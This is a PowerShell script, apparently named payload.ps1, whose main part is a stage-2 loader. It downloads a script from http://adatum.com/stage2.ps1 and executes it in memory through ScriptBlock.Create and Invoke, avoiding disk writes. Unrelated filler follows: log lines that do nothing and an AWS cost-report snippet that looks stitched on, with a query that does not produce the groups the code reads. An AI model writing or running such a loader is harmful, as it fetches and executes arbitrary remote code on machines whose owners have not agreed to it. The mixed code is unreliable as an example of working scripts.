<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.

.EXAMPLE
    PS> .\payload.ps1
#>
$Stage2Url = "http://adatum.com/stage2.ps1"
$StageLog = "$env:TEMP\transfer.log"
$TimeoutSec = 12
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 12
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $DownloadedScript = Get-StageScriptText -SourceUrl $Stage2Url -TimeoutSec $TimeoutSec
    $TransferResult = Invoke-Stage2Script -ScriptBody $DownloadedScript
    Write-Verbose "Stage result: $($TransferResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $Stage2Url
    ScriptLength = $DownloadedScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Collecting host metadata"
Write-Verbose "Validating result"
Write-Verbose "Preparing working directory"
Write-Verbose "Stage handoff finished"
Write-Verbose "Reading configuration values"
Write-Verbose "Resolving configured target"
Write-Verbose "Inspecting process list"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Threshold = 5000
$Region = 'us-east-1'
$ProfileName = "default"
$Month = "2025-11"
$Account = '287641700526'
$ReportPath = 'C:\Reports\cost-aws-2025-11.csv'
$OutputPath = 'C:\Reports\cost-aws-2025-11.json'

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$raw = aws ce get-cost-and-usage --time-period Start=$start,End=$end --granularity MONTHLY --metrics UnblendedCost --profile $ProfileName --region $Region --output json
$groups = ($raw | ConvertFrom-Json).ResultsByTime[0].Groups | ForEach-Object {
    [pscustomobject]@{ Service = $_.Keys[0]; Amount = [math]::Round([double]$_.Metrics.UnblendedCost.Amount, 2) }
}
$total = [math]::Round((($groups | Measure-Object -Property Amount -Sum).Sum), 2)
$groups | Sort-Object -Property Amount -Descending | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
if ($total -gt $Threshold) { Write-Warning ("Spend {0:N2} above threshold" -f $total) }
